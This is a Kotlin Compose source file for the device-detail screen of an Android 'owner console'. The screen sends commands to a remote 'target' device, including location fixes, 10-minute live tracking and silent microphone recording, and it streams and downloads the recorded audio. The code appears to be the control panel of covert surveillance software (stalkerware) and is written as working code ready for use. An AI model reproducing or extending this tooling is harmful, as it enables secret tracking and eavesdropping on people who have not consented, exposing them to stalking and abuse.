// Package: com.sm.ownerconsole.ui.detail
// Comprehensive command operations, telemetry viewer, live track and audio recordings player
package com.sm.ownerconsole.ui.detail

import android.app.DownloadManager
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Environment
import android.widget.Toast
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.sm.core.model.*
import com.sm.ownerconsole.data.repository.OwnerRepository
import com.sm.ownerconsole.ui.devices.StatusPill
import com.sm.ownerconsole.ui.devices.formatLastSeen
import com.sm.ownerconsole.ui.player.AudioPlayerController
import com.sm.ownerconsole.ui.theme.*
import kotlinx.coroutines.launch
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun DeviceDetailScreen(
    deviceId: String,
    onBack: () -> Unit
) {
    val context = LocalContext.current
    val repository = remember { OwnerRepository() }
    val coroutineScope = rememberCoroutineScope()
    val audioPlayer = remember { AudioPlayerController(context) }

    DisposableEffect(Unit) {
        onDispose {
            audioPlayer.release()
        }
    }

    var device by remember { mutableStateOf<Device?>(null) }
    var latestLocation by remember { mutableStateOf<LocationEntry?>(null) }
    var commands by remember { mutableStateOf<List<Command>>(emptyList()) }
    var recordings by remember { mutableStateOf<List<RecordingEntry>>(emptyList()) }
    var isLoading by remember { mutableStateOf(false) }

    // Dialog states
    var showRenameDialog by remember { mutableStateOf(false) }
    var showUnpairDialog by remember { mutableStateOf(false) }
    var renameText by remember { mutableStateOf("") }

    // Recording duration picker state: 5, 10, 30, 60 minutes
    var selectedAudioDuration by remember { mutableIntStateOf(5) }

    fun refreshAll() {
        coroutineScope.launch {
            val devResult = repository.fetchDeviceById(deviceId)
            if (devResult.isSuccess) {
                device = devResult.getOrNull()
            }
            val locResult = repository.fetchLatestLocation(deviceId)
            if (locResult.isSuccess) {
                latestLocation = locResult.getOrNull()
            }
            val cmdResult = repository.fetchRecentCommands(deviceId)
            if (cmdResult.isSuccess) {
                commands = cmdResult.getOrNull().orEmpty()
            }
            val recResult = repository.fetchRecordings(deviceId)
            if (recResult.isSuccess) {
                recordings = recResult.getOrNull().orEmpty()
            }
        }
    }

    LaunchedEffect(deviceId) {
        refreshAll()
    }

    Scaffold(
        topBar = {
            TopAppBar(
                title = {
                    Column {
                        Text(
                            text = device?.name ?: "DEVICE CONSOLE",
                            fontFamily = FontFamily.Monospace,
                            fontWeight = FontWeight.Bold,
                            fontSize = 16.sp,
                            color = TextWhite
                        )
                        Text(
                            text = "NODE: ${deviceId.take(8)}...",
                            fontFamily = FontFamily.Monospace,
                            fontSize = 10.sp,
                            color = CyanAccent
                        )
                    }
                },
                navigationIcon = {
                    IconButton(onClick = onBack) {
                        Icon(Icons.Default.ArrowBack, contentDescription = "Back", tint = TextWhite)
                    }
                },
                actions = {
                    IconButton(onClick = { refreshAll() }) {
                        Icon(Icons.Default.Refresh, contentDescription = "Refresh", tint = SkyAccent)
                    }
                    IconButton(onClick = {
                        renameText = device?.name ?: ""
                        showRenameDialog = true
                    }) {
                        Icon(Icons.Default.Edit, contentDescription = "Rename", tint = TextWhite)
                    }
                    IconButton(onClick = { showUnpairDialog = true }) {
                        Icon(Icons.Default.DeleteForever, contentDescription = "Unpair", tint = StatusRed)
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = DarkSurface
                )
            )
        }
    ) { innerPadding ->
        LazyColumn(
            modifier = Modifier
                .fillMaxSize()
                .padding(innerPadding)
                .background(DarkBg),
            contentPadding = PaddingValues(16.dp),
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            // 1. Device Info & Battery Card
            item {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp),
                    colors = CardDefaults.cardColors(containerColor = DarkCard),
                    border = CardDefaults.outlinedCardBorder().copy(brush = androidx.compose.ui.graphics.SolidColor(DarkBorder))
                ) {
                    Column(modifier = Modifier.padding(16.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.SpaceBetween,
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Text(
                                text = "${device?.model ?: "Android"} • v${device?.androidVersion ?: "16"}",
                                fontSize = 13.sp,
                                color = TextMuted,
                                fontFamily = FontFamily.Monospace
                            )
                            StatusPill(status = device?.status ?: DeviceStatus.OFFLINE)
                        }

                        Divider(color = DarkBorder.copy(alpha = 0.5f))

                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.SpaceBetween,
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Icon(
                                    imageVector = if (device?.isCharging == true) Icons.Default.BatteryChargingFull else Icons.Default.BatteryFull,
                                    contentDescription = null,
                                    tint = if ((device?.batteryLevel ?: 0) > 20) StatusGreen else StatusRed,
                                    modifier = Modifier.size(18.dp)
                                )
                                Spacer(modifier = Modifier.width(6.dp))
                                Text(
                                    text = "Battery: ${device?.batteryLevel ?: 0}% ${if (device?.isCharging == true) "[Charging]" else ""}",
                                    fontFamily = FontFamily.Monospace,
                                    fontSize = 12.sp,
                                    color = TextWhite
                                )
                            }
                            Text(
                                text = "Ping: ${formatLastSeen(device?.lastSeenAt)}",
                                fontFamily = FontFamily.Monospace,
                                fontSize = 11.sp,
                                color = TextMuted
                            )
                        }
                    }
                }
            }

            // 2. Command Action Center
            item {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp),
                    colors = CardDefaults.cardColors(containerColor = DarkSurface),
                    border = CardDefaults.outlinedCardBorder().copy(brush = androidx.compose.ui.graphics.SolidColor(DarkBorder))
                ) {
                    Column(
                        modifier = Modifier.padding(16.dp),
                        verticalArrangement = Arrangement.spacedBy(14.dp)
                    ) {
                        Text(
                            text = "COMMAND DISPATCH CENTER",
                            fontFamily = FontFamily.Monospace,
                            fontWeight = FontWeight.Bold,
                            fontSize = 13.sp,
                            color = CyanAccent,
                            letterSpacing = 1.sp
                        )

                        // Action Buttons Row: Get Location & Live Track
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(10.dp)
                        ) {
                            Button(
                                onClick = {
                                    coroutineScope.launch {
                                        val payload = buildJsonObject {
                                            put("high_accuracy", true)
                                        }.toString()
                                        repository.sendCommand(deviceId, CommandType.GET_LOCATION, payload)
                                        Toast.makeText(context, "Location command dispatched", Toast.LENGTH_SHORT).show()
                                        refreshAll()
                                    }
                                },
                                modifier = Modifier.weight(1f),
                                shape = RoundedCornerShape(8.dp),
                                colors = ButtonDefaults.buttonColors(containerColor = DarkCard),
                                border = ButtonDefaults.outlinedButtonBorder.copy(brush = androidx.compose.ui.graphics.SolidColor(CyanAccent))
                            ) {
                                Icon(Icons.Default.MyLocation, contentDescription = null, tint = CyanAccent, modifier = Modifier.size(16.dp))
                                Spacer(modifier = Modifier.width(6.dp))
                                Text("GET LOCATION", color = CyanAccent, fontSize = 11.sp, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
                            }

                            Button(
                                onClick = {
                                    coroutineScope.launch {
                                        val payload = buildJsonObject {
                                            put("duration_minutes", 10)
                                            put("interval_seconds", 10)
                                            put("high_accuracy", true)
                                        }.toString()
                                        repository.sendCommand(deviceId, CommandType.LIVE_TRACK, payload)
                                        Toast.makeText(context, "Live Track (10 min) started", Toast.LENGTH_SHORT).show()
                                        refreshAll()
                                    }
                                },
                                modifier = Modifier.weight(1f),
                                shape = RoundedCornerShape(8.dp),
                                colors = ButtonDefaults.buttonColors(containerColor = DarkCard),
                                border = ButtonDefaults.outlinedButtonBorder.copy(brush = androidx.compose.ui.graphics.SolidColor(SkyAccent))
                            ) {
                                Icon(Icons.Default.Timeline, contentDescription = null, tint = SkyAccent, modifier = Modifier.size(16.dp))
                                Spacer(modifier = Modifier.width(6.dp))
                                Text("LIVE TRACK 10M", color = SkyAccent, fontSize = 11.sp, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
                            }
                        }

                        // Silent Mic Recording Section
                        Divider(color = DarkBorder)

                        Text(
                            text = "SILENT AUDIO RECORDING (AAC 32kbps mono)",
                            fontFamily = FontFamily.Monospace,
                            fontWeight = FontWeight.SemiBold,
                            fontSize = 11.sp,
                            color = TextMuted
                        )

                        // Duration Chips (5, 10, 30, 60 min)
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            listOf(5, 10, 30, 60).forEach { mins ->
                                val isSelected = selectedAudioDuration == mins
                                Surface(
                                    modifier = Modifier
                                        .weight(1f)
                                        .clickable { selectedAudioDuration = mins },
                                    shape = RoundedCornerShape(6.dp),
                                    color = if (isSelected) CyanAccent else DarkCard,
                                    border = CardDefaults.outlinedCardBorder().copy(brush = androidx.compose.ui.graphics.SolidColor(if (isSelected) CyanAccent else DarkBorder))
                                ) {
                                    Box(modifier = Modifier.padding(vertical = 8.dp), contentAlignment = Alignment.Center) {
                                        Text(
                                            text = "$mins min",
                                            fontFamily = FontFamily.Monospace,
                                            fontWeight = FontWeight.Bold,
                                            fontSize = 12.sp,
                                            color = if (isSelected) DarkBg else TextWhite
                                        )
                                    }
                                }
                            }
                        }

                        // Start & Stop Audio Buttons
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(10.dp)
                        ) {
                            Button(
                                onClick = {
                                    coroutineScope.launch {
                                        val payload = buildJsonObject {
                                            put("duration_minutes", selectedAudioDuration)
                                        }.toString()
                                        repository.sendCommand(deviceId, CommandType.START_RECORDING, payload)
                                        Toast.makeText(context, "Silent record dispatched ($selectedAudioDuration min)", Toast.LENGTH_SHORT).show()
                                        refreshAll()
                                    }
                                },
                                modifier = Modifier.weight(1f),
                                shape = RoundedCornerShape(8.dp),
                                colors = ButtonDefaults.buttonColors(containerColor = CyanAccent)
                            ) {
                                Icon(Icons.Default.Mic, contentDescription = null, tint = DarkBg, modifier = Modifier.size(16.dp))
                                Spacer(modifier = Modifier.width(6.dp))
                                Text("START RECORD ($selectedAudioDuration m)", color = DarkBg, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold, fontSize = 11.sp)
                            }

                            Button(
                                onClick = {
                                    coroutineScope.launch {
                                        repository.sendCommand(deviceId, CommandType.STOP_RECORDING)
                                        Toast.makeText(context, "Stop command dispatched", Toast.LENGTH_SHORT).show()
                                        refreshAll()
                                    }
                                },
                                modifier = Modifier.weight(0.6f),
                                shape = RoundedCornerShape(8.dp),
                                colors = ButtonDefaults.buttonColors(containerColor = DarkCard),
                                border = ButtonDefaults.outlinedButtonBorder.copy(brush = androidx.compose.ui.graphics.SolidColor(StatusRed))
                            ) {
                                Icon(Icons.Default.Stop, contentDescription = null, tint = StatusRed, modifier = Modifier.size(16.dp))
                                Spacer(modifier = Modifier.width(4.dp))
                                Text("STOP", color = StatusRed, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold, fontSize = 11.sp)
                            }
                        }
                    }
                }
            }

            // 3. Latest Telemetry / Location Fix
            item {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp),
                    colors = CardDefaults.cardColors(containerColor = DarkCard),
                    border = CardDefaults.outlinedCardBorder().copy(brush = androidx.compose.ui.graphics.SolidColor(DarkBorder))
                ) {
                    Column(modifier = Modifier.padding(16.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.SpaceBetween,
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Text(
                                text = "LATEST LOCATION TELEMETRY",
                                fontFamily = FontFamily.Monospace,
                                fontWeight = FontWeight.Bold,
                                fontSize = 12.sp,
                                color = TextMuted
                            )
                            if (latestLocation != null) {
                                Text(
                                    text = "Accuracy: ±${latestLocation?.accuracy?.toInt()}m",
                                    fontFamily = FontFamily.Monospace,
                                    fontSize = 11.sp,
                                    color = StatusGreen
                                )
                            }
                        }

                        if (latestLocation != null) {
                            val loc = latestLocation!!
                            Text(
                                text = "COORDINATES: ${loc.latitude}, ${loc.longitude}",
                                fontFamily = FontFamily.Monospace,
                                fontSize = 13.sp,
                                fontWeight = FontWeight.Bold,
                                color = TextWhite
                            )
                            Text(
                                text = "Speed: ${loc.speed} m/s • Altitude: ${loc.altitude}m • Fixed: ${loc.capturedAt?.take(19) ?: "Recent"}",
                                fontFamily = FontFamily.Monospace,
                                fontSize = 11.sp,
                                color = TextMuted
                            )

                            Spacer(modifier = Modifier.height(4.dp))

                            OutlinedButton(
                                onClick = {
                                    val geoUri = Uri.parse("geo:${loc.latitude},${loc.longitude}?q=${loc.latitude},${loc.longitude}(Target)")
                                    val mapIntent = Intent(Intent.ACTION_VIEW, geoUri).apply {
                                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                    }
                                    try {
                                        context.startActivity(mapIntent)
                                    } catch (_: Exception) {
                                        // Fallback web url
                                        val webIntent = Intent(Intent.ACTION_VIEW, Uri.parse("https://maps.google.com/?q=${loc.latitude},${loc.longitude}")).apply {
                                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                        }
                                        context.startActivity(webIntent)
                                    }
                                },
                                modifier = Modifier.fillMaxWidth(),
                                shape = RoundedCornerShape(8.dp),
                                colors = ButtonDefaults.outlinedButtonColors(contentColor = CyanAccent)
                            ) {
                                Icon(Icons.Default.Map, contentDescription = null, modifier = Modifier.size(16.dp))
                                Spacer(modifier = Modifier.width(6.dp))
                                Text("OPEN IN GOOGLE MAPS", fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold, fontSize = 11.sp)
                            }
                        } else {
                            Text(
                                text = "No location fix recorded yet. Tap 'GET LOCATION' above to poll target.",
                                fontSize = 12.sp,
                                color = TextMuted
                            )
                        }
                    }
                }
            }

            // 4. Audio Recordings Section
            item {
                Text(
                    text = "RECORDINGS VAULT (${recordings.size})",
                    fontFamily = FontFamily.Monospace,
                    fontWeight = FontWeight.Bold,
                    fontSize = 13.sp,
                    color = CyanAccent,
                    letterSpacing = 1.sp
                )
            }

            if (recordings.isEmpty()) {
                item {
                    Surface(
                        modifier = Modifier.fillMaxWidth(),
                        color = DarkSurface,
                        shape = RoundedCornerShape(8.dp),
                        border = CardDefaults.outlinedCardBorder().copy(brush = androidx.compose.ui.graphics.SolidColor(DarkBorder))
                    ) {
                        Box(modifier = Modifier.padding(20.dp), contentAlignment = Alignment.Center) {
                            Text("No audio chunks available. Dispatched recordings will appear here.", fontSize = 12.sp, color = TextMuted)
                        }
                    }
                }
            } else {
                items(recordings, key = { it.id ?: it.storagePath }) { recording ->
                    RecordingCard(
                        recording = recording,
                        audioPlayer = audioPlayer,
                        onDelete = {
                            coroutineScope.launch {
                                repository.deleteRecording(recording.id ?: "", recording.storagePath)
                                Toast.makeText(context, "Recording chunk deleted", Toast.LENGTH_SHORT).show()
                                refreshAll()
                            }
                        },
                        onGetSignedUrl = { callback ->
                            coroutineScope.launch {
                                val urlResult = repository.getSignedAudioUrl(recording.storagePath)
                                if (urlResult.isSuccess) {
                                    callback(urlResult.getOrNull())
                                } else {
                                    Toast.makeText(context, "Could not generate download URL", Toast.LENGTH_SHORT).show()
                                }
                            }
                        }
                    )
                }
            }

            // 5. Command Log Section
            item {
                Spacer(modifier = Modifier.height(8.dp))
                Text(
                    text = "DISPATCH AUDIT LOG (${commands.size})",
                    fontFamily = FontFamily.Monospace,
                    fontWeight = FontWeight.Bold,
                    fontSize = 13.sp,
                    color = SkyAccent,
                    letterSpacing = 1.sp
                )
            }

            if (commands.isEmpty()) {
                item {
                    Text("No command audit records.", fontSize = 12.sp, color = TextMuted)
                }
            } else {
                items(commands, key = { it.id }) { cmd ->
                    CommandRow(
                        command = cmd,
                        onRetry = {
                            coroutineScope.launch {
                                repository.retryCommand(cmd.id)
                                Toast.makeText(context, "Command retried", Toast.LENGTH_SHORT).show()
                                refreshAll()
                            }
                        }
                    )
                }
            }

            item {
                Spacer(modifier = Modifier.height(40.dp))
            }
        }
    }

    // Rename Dialog
    if (showRenameDialog) {
        AlertDialog(
            onDismissRequest = { showRenameDialog = false },
            containerColor = DarkSurface,
            title = { Text("RENAME AGENT", color = TextWhite, fontFamily = FontFamily.Monospace, fontSize = 16.sp) },
            text = {
                OutlinedTextField(
                    value = renameText,
                    onValueChange = { renameText = it },
                    label = { Text("Agent Name") },
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = CyanAccent,
                        unfocusedBorderColor = DarkBorder,
                        focusedTextColor = TextWhite,
                        unfocusedTextColor = TextWhite
                    ),
                    modifier = Modifier.fillMaxWidth()
                )
            },
            confirmButton = {
                Button(
                    onClick = {
                        coroutineScope.launch {
                            repository.renameDevice(deviceId, renameText)
                            showRenameDialog = false
                            refreshAll()
                        }
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = CyanAccent)
                ) {
                    Text("SAVE", color = DarkBg, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
                }
            },
            dismissButton = {
                TextButton(onClick = { showRenameDialog = false }) {
                    Text("CANCEL", color = TextMuted)
                }
            }
        )
    }

    // Unpair Dialog
    if (showUnpairDialog) {
        AlertDialog(
            onDismissRequest = { showUnpairDialog = false },
            containerColor = DarkSurface,
            title = { Text("CONFIRM UNPAIR", color = StatusRed, fontFamily = FontFamily.Monospace, fontSize = 16.sp) },
            text = {
                Text(
                    "Are you sure you want to unpair and remove this device? All associated telemetry and recordings will be purged.",
                    color = TextMuted,
                    fontSize = 13.sp
                )
            },
            confirmButton = {
                Button(
                    onClick = {
                        coroutineScope.launch {
                            repository.unpairDevice(deviceId)
                            showUnpairDialog = false
                            onBack()
                        }
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = StatusRed)
                ) {
                    Text("UNPAIR & PURGE", color = Color.White, fontFamily = FontFamily.Monospace, fontWeight = FontWeight.Bold)
                }
            },
            dismissButton = {
                TextButton(onClick = { showUnpairDialog = false }) {
                    Text("CANCEL", color = TextMuted)
                }
            }
        )
    }
}

@Composable
private fun RecordingCard(
    recording: RecordingEntry,
    audioPlayer: AudioPlayerController,
    onDelete: () -> Unit,
    onGetSignedUrl: ((String?) -> Unit) -> Unit
) {
    val context = LocalContext.current
    var signedUrl by remember { mutableStateOf<String?>(null) }
    var isLoadingUrl by remember { mutableStateOf(false) }

    val isCurrentAudio = signedUrl != null && audioPlayer.currentlyPlayingUrl == signedUrl
    val isPlaying = isCurrentAudio && audioPlayer.isPlaying

    Card(
        modifier = Modifier.fillMaxWidth(),
        shape = RoundedCornerShape(10.dp),
        colors = CardDefaults.cardColors(containerColor = DarkCard),
        border = CardDefaults.outlinedCardBorder().copy(brush = androidx.compose.ui.graphics.SolidColor(DarkBorder))
    ) {
        Column(modifier = Modifier.padding(14.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Column(modifier = Modifier.weight(1f)) {
                    Text(
                        text = "Chunk #${recording.chunkIndex} (${recording.durationSeconds}s)",
                        fontWeight = FontWeight.Bold,
                        fontFamily = FontFamily.Monospace,
                        fontSize = 13.sp,
                        color = TextWhite
                    )
                    Text(
                        text = "Recorded: ${recording.recordedAt?.take(19) ?: "Unknown"} • ${formatFileSize(recording.fileSizeBytes)}",
                        fontSize = 11.sp,
                        color = TextMuted
                    )
                }

                Row {
                    // Download icon
                    IconButton(onClick = {
                        if (signedUrl != null) {
                            downloadFile(context, signedUrl!!, "rec_${recording.chunkIndex}.m4a")
                        } else {
                            onGetSignedUrl { url ->
                                if (url != null) {
                                    signedUrl = url
                                    downloadFile(context, url, "rec_${recording.chunkIndex}.m4a")
                                }
                            }
                        }
                    }) {
                        Icon(Icons.Default.Download, contentDescription = "Download", tint = SkyAccent, modifier = Modifier.size(20.dp))
                    }

                    // Delete icon
                    IconButton(onClick = onDelete) {
                        Icon(Icons.Default.DeleteOutline, contentDescription = "Delete", tint = StatusRed, modifier = Modifier.size(20.dp))
                    }
                }
            }

            // Player Bar
            Row(
                modifier = Modifier.fillMaxWidth(),
                verticalAlignment = Alignment.CenterVertically
            ) {
                IconButton(
                    onClick = {
                        if (signedUrl != null) {
                            audioPlayer.playUrl(signedUrl!!)
                        } else {
                            isLoadingUrl = true
                            onGetSignedUrl { url ->
                                isLoadingUrl = false
                                if (url != null) {
                                    signedUrl = url
                                    audioPlayer.playUrl(url)
                                }
                            }
                        }
                    }
                ) {
                    if (isLoadingUrl) {
                        CircularProgressIndicator(modifier = Modifier.size(18.dp), color = CyanAccent, strokeWidth = 2.dp)
                    } else {
                        Icon(
                            imageVector = if (isPlaying) Icons.Default.PauseCircle else Icons.Default.PlayCircle,
                            contentDescription = "Play/Pause",
                            tint = CyanAccent,
                            modifier = Modifier.size(32.dp)
                        )
                    }
                }

                Spacer(modifier = Modifier.width(8.dp))

                if (isCurrentAudio) {
                    Slider(
                        value = audioPlayer.currentPositionMs.toFloat(),
                        onValueChange = { audioPlayer.seekTo(it.toLong()) },
                        valueRange = 0f..(audioPlayer.durationMs.coerceAtLeast(1L).toFloat()),
                        colors = SliderDefaults.colors(
                            thumbColor = CyanAccent,
                            activeTrackColor = CyanAccent,
                            inactiveTrackColor = DarkBorder
                        ),
                        modifier = Modifier.weight(1f)
                    )

                    Spacer(modifier = Modifier.width(8.dp))

                    Text(
                        text = "${AudioPlayerController.formatMs(audioPlayer.currentPositionMs)} / ${AudioPlayerController.formatMs(audioPlayer.durationMs)}",
                        fontFamily = FontFamily.Monospace,
                        fontSize = 10.sp,
                        color = TextWhite
                    )
                } else {
                    Text(
                        text = "Tap play to stream from cloud bucket",
                        fontFamily = FontFamily.Monospace,
                        fontSize = 11.sp,
                        color = TextMuted,
                        modifier = Modifier.weight(1f)
                    )
                }
            }
        }
    }
}

@Composable
private fun CommandRow(
    command: Command,
    onRetry: () -> Unit
) {
    Surface(
        modifier = Modifier.fillMaxWidth(),
        color = DarkSurface,
        shape = RoundedCornerShape(8.dp),
        border = CardDefaults.outlinedCardBorder().copy(brush = androidx.compose.ui.graphics.SolidColor(DarkBorder))
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(12.dp),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Column(modifier = Modifier.weight(1f)) {
                Text(
                    text = command.type.uppercase(),
                    fontWeight = FontWeight.Bold,
                    fontFamily = FontFamily.Monospace,
                    fontSize = 12.sp,
                    color = TextWhite
                )
                Text(
                    text = "Status: ${command.status.uppercase()} • ${command.createdAt?.take(19) ?: ""}",
                    fontFamily = FontFamily.Monospace,
                    fontSize = 11.sp,
                    color = when (command.status) {
                        CommandStatus.COMPLETED -> StatusGreen
                        CommandStatus.EXECUTING -> StatusAmber
                        CommandStatus.FAILED -> StatusRed
                        else -> CyanAccent
                    }
                )
                if (!command.errorMessage.isNullOrBlank()) {
                    Text(
                        text = "Error: ${command.errorMessage}",
                        fontSize = 10.sp,
                        color = StatusRed
                    )
                }
            }

            if (command.status == CommandStatus.FAILED || command.status == CommandStatus.PENDING) {
                OutlinedButton(
                    onClick = onRetry,
                    shape = RoundedCornerShape(6.dp),
                    contentPadding = PaddingValues(horizontal = 8.dp, vertical = 2.dp)
                ) {
                    Text("RETRY", fontFamily = FontFamily.Monospace, fontSize = 10.sp, color = SkyAccent)
                }
            }
        }
    }
}

private fun formatFileSize(bytes: Long): String {
    if (bytes <= 0) return "0 KB"
    val kb = bytes / 1024
    if (kb < 1024) return "$kb KB"
    val mb = kb / 1024f
    return "%.1f MB".format(mb)
}

private fun downloadFile(context: Context, url: String, filename: String) {
    try {
        val request = DownloadManager.Request(Uri.parse(url))
            .setTitle(filename)
            .setDescription("Downloading telemetry audio chunk")
            .setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED)
            .setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, filename)
            .setAllowedOverMetered(true)

        val dm = context.getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager
        dm.enqueue(request)
        Toast.makeText(context, "Download started to Downloads folder", Toast.LENGTH_SHORT).show()
    } catch (_: Exception) {
        val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        context.startActivity(intent)
    }
}
